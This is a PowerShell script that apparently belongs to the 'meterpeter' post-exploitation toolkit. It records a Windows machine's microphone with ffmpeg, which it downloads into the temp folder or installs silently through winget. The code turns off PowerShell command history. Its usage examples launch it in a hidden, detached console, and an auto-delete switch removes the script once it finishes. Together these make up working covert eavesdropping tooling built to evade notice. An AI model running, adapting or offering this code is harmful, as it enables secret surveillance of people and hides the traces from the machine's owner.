<#
.SYNOPSIS
   records mic audio until -rectime <sec> its reached

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: ffmpeg.exe {auto-download}
   Optional Dependencies: Curl, WinGet {native}
   PS cmdlet Dev version: v1.1.6

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.14.1 that records native
   microphone audio until -rectime <seconds> parameter its reached

.NOTES
   The first time this cmdlet runs, it checks if ffmpeg.exe its present in
   -workingdir "$Env:TMP". If not, it downloads it from GitHub repo (download
   takes aprox 2 minutes) and execute it, at 2º time run it will start recording
   audio instantly without the need to download or install ffmpeng codec again.

   -download 'Store'  - downloads\install\executes ffmpeg.exe using WinGet
   -download 'GitHub' - downloads\execute ffmpeg.exe from working dir (%TMP%)

.Parameter workingDir
   Cmdlet working directory (default: $Env:TMP)

.Parameter Mp3Name
   The audio file name (default: AudioClip.mp3)

.Parameter RecTime
   Record audio for xx seconds (default: 10)

.Parameter Download
   Download ffmpeg from Store|GitHub (default: GitHub)

.Parameter Random
   Switch that random generates Mp3 filename

.Parameter AutoDelete
   Switch that auto-deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -workingDir "$pwd"
   Use current directory as working directory

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -rectime '25' -download 'store'
   Download ffmpeg from MStore, record audio for 25 seconds

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -random -download 'GitHub'
   Download ffmpeg from GitHub, random generate MP3 file name

.EXAMPLE
   PS C:\> .\rec_audio.ps1 -uninstall
   UnInstall ffmpeg from MStore [local]

.EXAMPLE
   PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -autodelete"
   Execute this cmdlet for 60 seconds in an hidden console detach from parent process (orphan process)

.INPUTS
   None. You cannot pipe objects into rec_audio.ps1

.OUTPUTS
   [!!] 🔌 record native microphone audio 🔌
   [**] downloading : ffmpeg-release-essentials.zip

     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
   100   284  100   284    0     0    314      0 --:--:-- --:--:-- --:--:--   314
   100 83.4M  100 83.4M    0     0   614k      0  0:02:19  0:02:19 --:--:--  545k

   [**] executing   : ffmpeg.exe from 'C:\Users\pedro\AppData\Local\Temp'
   [aist#0:0/pcm_s16le @ 0000026dcda68a00] Guessed Channel Layout: stereo
   Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
     Duration: N/A, start: 39636.041000, bitrate: 1411 kb/s
     Stream #0:0: Audio: pcm_s16le, 44100 Hz, stereo, s16, 1411 kb/s
   Stream mapping:
     Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
   Press [q] to stop, [?] for help
   Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
     Metadata:
       TSSE            : Lavf60.22.101
     Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
         Metadata:
           encoder         : Lavc60.40.100 libmp3lame
   [out#0/mp3 @ 0000026dcdb066c0] video:0KiB audio:78KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.575715%
   size=      79KiB time=00:00:05.00 bitrate= 129.1kbits/s speed=0.909x

.LINK
   https://github.com/r00t-3xp10it/redpil
   https://img.ly/blog/ultimate-guide-to-ffmpeg
   https://learn.microsoft.com/en-us/windows/package-manager/winget
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Mp3Name="AudioClip.mp3",
   [string]$WorkingDir="$Env:TMP",
   [string]$Download="GitHub",
   [switch]$AutoDelete,
   [switch]$UnInstall,
   [int]$RecTime='10',
   [switch]$Random
)


$cmdletver = "v1.1.6"
$IPath = (Get-Location).Path.ToString()
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "rec_audio $cmdletver"

## Set default record time (seconds)
If([string]::IsNullOrEmpty($RecTime))
{
   $RecTime = 10
}

cd "$WorkingDir"
write-host "`n[!!] 🔌 record native microphone audio 🔌" -ForegroundColor Green

If($UnInstall.IsPresent)
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - UnInstall Pacakage ffmpeg from store [local]

   .OUTPUTS
      [!!] 🔌 record native microphone audio 🔌
      Encontrado FFmpeg [Gyan.FFmpeg]
      Iniciando a desinstalação do pacote...
      Limpando o diretório de instalação...
      Desinstalado com êxito
   #>

   ## Search for FFmpeg Pacakage locally
   $IsAvailable = (Winget list|findstr /C:"FFmpeg")
   If([string]::IsNullOrEmpty($IsAvailable))
   {
      write-host "[..] program 'FFmpeg' not found in store [local]`n" -ForegroundColor Red
      cd "$IPath"
      return      
   }

   ## Silent Uninstall FFmpeg program from local machine
   winget uninstall --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --purge --disable-interactivity
   If($? -match 'false')
   {
      write-host "[..] fail Uninstalling program 'FFmpeg' id 'Gyan.FFmpeg'" -ForegroundColor Red
   }

   write-host ""
   cd "$IPath"
   return
}

If($Download -imatch '^(Store)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download ffmpeg.exe from WinGet [store]

   .OUTPUTS
      [!!] 🔌 record native microphone audio 🔌
      [**] searching program 'FFmpeg' [local|remote]
      Encontrado FFmpeg [Gyan.FFmpeg] Versão 6.1.1
      Este aplicativo é licenciado para você pelo proprietário.
      A Microsoft não é responsável por, nem concede licenças a pacotes de terceiros.
      Baixando https://github.com/GyanD/codexffmpeg/releases/download/6.1.1/ffmpeg-6.1.1-full_build.zip
        ██████████████████████████████   154 MB /  154 MB
      Hash do instalador verificado com êxito
      Extraindo arquivo...
      Arquivo extraído com êxito
      Iniciando a instalação do pacote...
      Variável de ambiente do caminho modificada; reinicie seu shell para usar o novo valor.
      O alias da linha de comando foi adicionado: "ffmpeg"
      O alias da linha de comando foi adicionado: "ffplay"
      O alias da linha de comando foi adicionado: "ffprobe"
      Instalado com êxito

      [**] executing   : ffmpeg program (WinGet Location)
      [aist#0:0/pcm_s16le @ 00000208c4d4a100] Guessed Channel Layout: stereo
      Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
        Duration: N/A, start: 127348.921000, bitrate: 1411 kb/s
        Stream #0:0: Audio: pcm_s16le, 44100 Hz, 2 channels, s16, 1411 kb/s
      Stream mapping:
        Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
      Press [q] to stop, [?] for help
      Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
        Metadata:
          TSSE            : Lavf60.16.100
        Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
          Metadata:
            encoder         : Lavc60.31.102 libmp3lame
      [out#0/mp3 @ 00000208c4d49300] video:0kB audio:235kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.192239%
      size=     235kB time=00:00:14.98 bitrate= 128.5kbits/s speed=0.998x
   #>

   ## Make sure Pacakage its not already intalled
   write-host "[**] searching program 'FFmpeg' [local|remote]" -ForegroundColor Green
   $CheckLocal = (winget list|findstr /C:"FFmpeg")
   If(-not([string]::IsNullOrEmpty($CheckLocal)))
   {
      write-host "[..] MStore program 'FFmpeg' installed! [local]" -ForegroundColor Green
      Start-Sleep -Seconds 1   
   }
   Else
   {
      ## Search for Pacakage in microsoft store
      $IsAvailable = (Winget search --name "FFmpeg" --exact|Select-String -Pattern "Gyan.FFmpeg 6.1.1")
      If([string]::IsNullOrEmpty($IsAvailable))
      {
         write-host "[..] Error program 'FFmpeg' not found in msstore!`n" -ForegroundColor Red
         cd "$IPath"
         return      
      }

      ## Silent install program from microsoft store
      winget install --name "FFmpeg" --id "Gyan.FFmpeg" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
      If($? -match 'false')
      {
         write-host "[..] fail installing program 'FFmpeg' id 'Gyan.FFmpeg' from msstore`n" -ForegroundColor Red
         cd "$IPath"
         return      
      }
      write-host ""
   }
}
Else
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Download ffmpeg.exe from www.gyan.dev [ZIP]

   .LINK
      https://adamtheautomator.com/install-ffmpeg

   .OUTPUTS
      [!!] 🔌 record native microphone audio 🔌
      [**] downloading : ffmpeg-release-essentials.zip

        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                       Dload  Upload   Total   Spent    Left  Speed
      100   284  100   284    0     0    252      0  0:00:01  0:00:01 --:--:--   252
      100 83.4M  100 83.4M    0     0   318k      0  0:04:27  0:04:27 --:--:-- 1065k

      [**] executing   : ffmpeg.exe from 'C:\Users\pedro\AppData\Local\Temp'
      [aist#0:0/pcm_s16le @ 0000029872071d40] Guessed Channel Layout: stereo
      Input #0, dshow, from 'audio=Microfone (Conexant SmartAudio HD)':
        Duration: N/A, start: 128459.862000, bitrate: 1411 kb/s
        Stream #0:0: Audio: pcm_s16le, 44100 Hz, 2 channels, s16, 1411 kb/s
      Stream mapping:
        Stream #0:0 -> #0:0 (pcm_s16le (native) -> mp3 (libmp3lame))
      Press [q] to stop, [?] for help
      Output #0, mp3, to 'C:\Users\pedro\AppData\Local\Temp\AudioClip.mp3':
        Metadata:
          TSSE            : Lavf60.16.100
        Stream #0:0: Audio: mp3, 44100 Hz, mono, s16p, 128 kb/s
          Metadata:
            encoder         : Lavc60.31.102 libmp3lame
      [out#0/mp3 @ 0000029872072d80] video:0kB audio:235kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.192239%
      size=     235kB time=00:00:14.98 bitrate= 128.6kbits/s speed=0.999x
   #>

   ## Download ffmpeg.exe from GitHub repository
   If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
   {
      ## Download ffmpeg using curl {faster}
      write-host "[**] " -ForegroundColor Green -NoNewline
      write-host "downloading : " -NoNewline;write-host "ffmpeg-release-essentials.zip`n" -ForegroundColor Green
      curl.exe -L 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -o "$WorkingDir\ffmpeg_64.zip"
      If(-not(Test-Path "$WorkingDir\ffmpeg_64.zip"))
      {
         write-host "[..] fail downloading $WorkingDir\ffmpeg_64.zip`n" -ForegroundColor Red
         cd "$IPath"
         return
      }

      ## Expand archive in working directory
      Expand-Archive "$WorkingDir\ffmpeg_64.zip" -DestinationPath "$WorkingDir" -force
      If(-not(Test-Path "$WorkingDir\ffmpeg-6.1.1-essentials_build"))
      {
         write-host "[..] fail expanding ffmpeg_64.zip archive`n" -ForegroundColor Red
         cd "$IPath"
         return
      }

      ## Move ffmpeg.exe from ffmpeg-master-latest-win64-gpl directory to 'cmdlet working directory'
      Move-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build\bin\ffmpeg.exe" -Destination "$WorkingDir\ffmpeg.exe" -Force

      ## CleanUp of files left behind
      Remove-Item -Path "$WorkingDir\ffmpeg-6.1.1-essentials_build" -Force -Recurse
      Remove-Item -Path "$WorkingDir\ffmpeg_64.zip" -Force
      write-host ""
   }

   ## Make sure we have downloaded ffmpeg.exe!
   If(-not(Test-Path "$WorkingDir\ffmpeg.exe"))
   {
      write-host "[..] fail downloading ffmpeg.exe to '$WorkingDir'`n" -ForegroundColor Red
      cd "$IPath"
      return
   }
}

## Add Assemblies
Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system;
   
function GetFriendlyName($Audioid)
{
   $MMDEVAPI = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$Audioid";
   return (Get-ItemProperty $MMDEVAPI).FriendlyName
}

$Audioid = [audio]::GetDefault(1);
$MicName = "$(GetFriendlyName $Audioid)";

If($Random.IsPresent)
{
   ## Random .MP3 file name creation
   $RandomN = [IO.Path]::GetFileNameWithoutExtension([System.IO.Path]::GetRandomFileName())
   $MP3Path = "$WorkingDir" + "\" + "$RandomN" + ".mp3" -join ''
}
Else
{
   $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
}


If($Download -imatch '^(Store)$')
{
   write-host "[**] " -ForegroundColor Green -NoNewline
   write-host "executing   : " -NoNewline;write-host "ffmpeg program (WinGet Location)" -ForegroundColor Green
   $SearchForFFmpeg = (GCI -Path "$Env:LOCALAPPDATA\Microsoft\winget\Packages" -Recurse|Select-Object *).FullName|Where-Object{$_ -match '(ffmpeg.exe)$'}|Select-Object -Last 1
   $FFmpegInstallPath = $SearchForFFmpeg -replace '\\ffmpeg.exe',''

   cd "$FFmpegInstallPath"
   ## cd "$Env:LOCALAPPDATA\Microsoft\WinGet\Packages\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\ffmpeg-6.1.1-full_build\bin"
   .\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -filter_complex "volume=1.1" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
}
Else
{
   write-host "[**] " -ForegroundColor Green -NoNewline;write-host "executing   : " -NoNewline
   write-host "ffmpeg.exe" -ForegroundColor Green -NoNewline;write-host " from '" -NoNewline
   write-host "$WorkingDir" -ForegroundColor Green -NoNewline;write-host "'"
   .\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -filter_complex "volume=1.1" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
}

cd "$IPath" ## Return to start directory
## Meterpeter CleanUp
If($AutoDelete.IsPresent)
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}
write-host ""
exit